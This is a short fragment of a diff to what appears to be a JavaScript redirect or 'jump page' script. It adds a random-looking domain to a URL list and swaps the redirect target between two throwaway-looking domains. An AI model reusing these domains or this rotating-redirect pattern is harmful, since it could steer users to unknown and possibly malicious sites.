@@ -42,7 +42,7 @@ var urls=[];
         urls.push(".jbwgoaie.org");    
         
                      	
-var JumpPage="https://ibftnse.top";
+var JumpPage="https://rhhdhmw.space";
 
 var newestUrls = [];
 
